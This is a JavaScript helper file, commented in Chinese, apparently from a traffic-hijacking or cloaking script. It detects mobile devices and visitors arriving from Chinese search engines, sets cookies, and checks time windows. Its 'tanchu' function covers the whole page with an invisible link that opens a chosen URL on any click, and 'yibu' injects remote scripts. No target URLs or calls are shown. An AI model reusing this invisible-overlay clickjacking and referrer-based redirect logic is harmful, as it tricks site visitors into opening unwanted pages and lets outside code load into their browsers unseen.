var wap = navigator.userAgent.match(/Android|Linux|iPad|iPhone|iPod/i) != null;
var ios = navigator.userAgent.match(/iPad|iPhone|iPod/i) != null;
var azs = navigator.userAgent.match(/Android|Linux/i) != null;
var lailu = document.referrer.toLowerCase().match(/sogou|soso|baidu|sm|so/i) != null;
//弹出新窗口
function tanchu(url){
    var tanchuhtml='<a style="background: transparent;border:none;width:100%;height:100%;margin:0;padding:0;z-index:9999;position:fixed;top:0;left:0;" class="btn" href="'+url+'" onclick="yincang(\'tanchu\')" target="_blank"></a>';
    var zijian_1 = document.createElement('span');
    zijian_1.id = 'tanchu';
    document.body.appendChild(zijian_1);
    document.getElementById('tanchu').innerHTML= tanchuhtml;
}
//点击删除元素
function yincang(idname){
    var el = document.getElementById(idname);
    el.parentNode.removeChild(el);
}
//添加cookie
function setCookie(name,value,miao){
	var exp = new Date();
	exp.setTime(exp.getTime() + miao*1000);
	document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}
//删除cookie
function delCookie(name,value,miao){
	var exp = new Date();
	exp.setTime(exp.getTime() - miao*1000);
	document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}
//获取cookie状态
function getCookie(name){
	var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
	if(arr=document.cookie.match(reg)){
		return unescape(arr[2]);
	}else{
		return false;
	}
}
//匹配数组
Array.prototype.in_array = function (e) {
    var r=new RegExp(','+e+',');
    return (r.test(',' + this.join(this.S) + ','));
}
//判断时间
function time_range(beginTime, endTime) {
    var strb = beginTime.split(":");
    if (strb.length != 2) {
        return false;
    }
 
    var stre = endTime.split(":");
    if (stre.length != 2) {
        return false;
    }
 
    var b = new Date();
    var e = new Date();
    var n = new Date();
    //n.setHours(22);
    
    b.setHours(strb[0]);
    b.setMinutes(strb[1]);
    e.setHours(stre[0]);
    e.setMinutes(stre[1]);
 
    if (n.getTime() - b.getTime() > 0 && n.getTime() - e.getTime() < 0) {
       return true;
    } else {
       return false;
    }
}
//异步加载
function yibu(url){
    var linkdownaa = document.createElement("script");
    linkdownaa.src = url;
    var linkesdownaa = document.getElementsByTagName("script")[0];
    linkesdownaa.parentNode.insertBefore(linkdownaa, linkesdownaa);
}